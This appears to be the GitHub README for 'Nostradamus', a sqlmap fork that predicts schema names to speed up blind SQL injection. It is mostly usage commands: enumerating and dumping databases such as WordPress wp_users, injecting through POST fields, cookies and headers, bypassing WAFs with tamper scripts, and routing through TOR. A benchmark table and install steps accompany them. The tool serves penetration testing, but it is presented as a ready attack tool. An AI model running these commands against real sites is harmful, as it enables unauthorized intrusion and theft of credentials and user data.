# Nostradamus

**SQL injection exploitation tool with predictive schema inference engine**

Nostradamus is a fork of [sqlmap](https://github.com/sqlmapproject/sqlmap) enhanced with a multi-layer prediction engine that dramatically reduces the number of queries needed during blind SQL injection data extraction.

## How it works

During blind SQL injection (especially time-based), traditional tools extract data character by character using binary search (~8 queries per character). With `--time-sec=10`, each character takes ~42 seconds. A single table name can take 5+ minutes. A full schema can take hours.

Nostradamus predicts the full value after extracting just 3-4 characters, then verifies with a single equality query. If correct, it skips all remaining characters. If wrong, the cost is minimal (~0.3s for a FALSE response).

## Features

### Predictive Schema Inference Engine
- **34,000+ entries** in optimized Trie data structure for instant prefix lookup
- **5 prediction layers** with priority weights (learned > pattern > CMS > dictionary > language)
- **Self-learning** — detects prefixes, separators, case style, and language from extracted values
- **Charset hints** — optimizes bisection order even when exact prediction fails (free, no extra queries)
- **Session persistence** — learned patterns survive between runs via hashDB

### Automatic CMS Detection
Nostradamus automatically identifies the target's CMS/framework from the first discovered table and boosts all known tables for that platform to maximum priority. Supported platforms:

WordPress, Joomla, Drupal, Magento, PrestaShop, Moodle, Django, Laravel, Rails, phpBB, Nextcloud, SuiteCRM, vTiger, Dolibarr, GLPI, MantisBT, MediaWiki, Ghost

### Column Context Prediction
When extracting column names, Nostradamus knows the expected columns for 40+ common tables. If it detects you're extracting columns from `wp_users`, it predicts `user_login`, `user_pass`, `user_email`, `display_name`, etc.

### Value Prediction
When extracting data values, Nostradamus predicts common values based on the column name. For a `status` column it predicts `active`, `pending`, `disabled`. For `role` it predicts `admin`, `editor`, `subscriber`. Supports status, role, language, payment method, country, post types, and more.

### 780+ Known Table Definitions
Pre-loaded schemas for CMS, frameworks, and products with known SQLi CVEs:

| Category | Products | Tables |
|----------|----------|--------|
| CMS | WordPress + WooCommerce + Yoast + plugins, Joomla, Drupal, Ghost, MediaWiki | 180+ |
| E-commerce | Magento, PrestaShop, osCommerce, OpenCart | 145+ |
| Frameworks | Django, Laravel, Rails, Spring Boot, Strapi | 60+ |
| CRM/ERP | SuiteCRM, vTiger, Dolibarr, OrangeHRM | 100+ |
| IT Management | GLPI, MantisBT, Cacti, Zabbix | 90+ |
| Community | phpBB, Nextcloud, Discourse, Moodle | 85+ |

### Real-Time Statistics
At the end of each run, shows hits, misses, measured query timing, and a verdict:

```
[INFO] predictor CMS detected: wordpress
[INFO] predictor stats - hits: 29, misses: 77, hit rate: 27%
[INFO] predictor stats - queries saved: 1442, queries wasted: 77, net: +1365 queries
[INFO] predictor stats - avg query time: 10.34s (measured), time saved: 868.6s, time wasted: 42.1s
[INFO] predictor verdict: BENEFICIAL (saved 826.5s = 13.8 min)
```

### Safety Guards
- Max 5 prediction attempts per value
- Only retries when the top candidate changes
- Auto-disables after 20 attempts with less than 5% hit rate
- `--no-predict` flag to disable completely

## Installation

### Linux / macOS

```bash
git clone https://github.com/nekros1xx/nostradamus.git && cd nostradamus && chmod +x install.sh && ./install.sh
```

### Windows (PowerShell)

```powershell
git clone https://github.com/nekros1xx/nostradamus.git; cd nostradamus; .\install.bat
```

After installation, the `nostradamus` command is available globally from any directory.

### Uninstall

```bash
# Linux / macOS
~/.nostradamus/install.sh --uninstall

# Windows
%USERPROFILE%\.nostradamus\install.bat --uninstall
```

## Usage

100% compatible with sqlmap. All existing flags work identically.

### Basic Enumeration

```bash
nostradamus -u "http://target.com/page?id=1" --batch --dbs
nostradamus -u "http://target.com/page?id=1" --batch --tables -D wordpress
nostradamus -u "http://target.com/page?id=1" --batch --columns -D wordpress -T wp_users
nostradamus -u "http://target.com/page?id=1" --batch --dump -D wordpress -T wp_users
```

### Forcing Specific Techniques

```bash
# Boolean-based blind
nostradamus -u "http://target.com/page?id=1" --technique=B --batch --tables

# Time-based blind (where prediction saves the most time)
nostradamus -u "http://target.com/page?id=1" --technique=T --batch --tables --time-sec=10

# Stacked queries
nostradamus -u "http://target.com/page?id=1" --technique=S --batch --tables --time-sec=10
```

### POST and Header Injection

```bash
# POST parameter
nostradamus -u "http://target.com/login" --data="user=admin&pass=test" -p user --batch --dbs

# Cookie injection
nostradamus -u "http://target.com/dashboard" --cookie="session=abc123" -p session --batch --dbs

# Custom header
nostradamus -u "http://target.com/api" --headers="X-Token: 1*" --batch --dbs
```

### MSSQL / Specific DBMS

```bash
nostradamus -u "http://target.com/page" --data="id=5" -p id \
  --dbms="Microsoft SQL Server" --technique=S --batch --tables \
  --time-sec=10 --force-ssl --random-agent
```

### Prediction Control

```bash
# Disable prediction
nostradamus -u "http://target.com/page?id=1" --no-predict --batch --dbs

# Verbose mode (see hits/misses in real-time)
nostradamus -u "http://target.com/page?id=1" --batch --tables -v 3

# Benchmark: compare with and without prediction
time nostradamus -u "http://target.com/?id=1" --technique=B --batch --tables --flush-session
time nostradamus -u "http://target.com/?id=1" --technique=B --batch --tables --flush-session --no-predict
```

### Advanced Options

```bash
# Through Burp Suite proxy
nostradamus -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080" --batch --dbs

# WAF bypass with tamper scripts
nostradamus -u "http://target.com/page?id=1" --tamper=space2comment,between --batch --dbs

# Through TOR
nostradamus -u "http://target.com/page?id=1" --tor --tor-type=SOCKS5 --batch --dbs
```

## Benchmark Results

Tested against 26 databases with diverse naming patterns:

| Database | Pattern | Hit Rate | Net Queries Saved |
|----------|---------|----------|-------------------|
| WordPress Full | wp_ + plugins | 27% | +1,365 |
| MantisBT | mantis_*_table | 41% | +1,255 |
| Magento | catalog/sales/eav | 36% | +1,160 |
| Drupal | cache/node/taxonomy | 39% | +1,127 |
| vTiger CRM | vtiger_ | 37% | +1,100 |
| Moodle | mdl_ | 32% | +1,064 |
| Django | auth_/django_ | 43% | +883 |
| SuiteCRM | accounts/contacts | 37% | +815 |
| PrestaShop | ps_ | 31% | +779 |
| Joomla | jos_ | 24% | +678 |
| GLPI | glpi_ | 30% | +611 |
| Rails | active_storage | 29% | +529 |
| phpBB | phpbb_ | 37% | +498 |
| Dolibarr | llx_ | 29% | +460 |
| Nextcloud | oc_ | 25% | +274 |

With `--time-sec=10`, each saved query = 10 seconds. For MantisBT (+1,255 queries): **~3.5 hours saved**.

## Credits

Built on top of [sqlmap](https://github.com/sqlmapproject/sqlmap). Developed by [Sergio Cabrera](https://www.linkedin.com/in/sergio-cabrera-878766239/).

## License

Same as sqlmap. See [LICENSE](LICENSE) file.
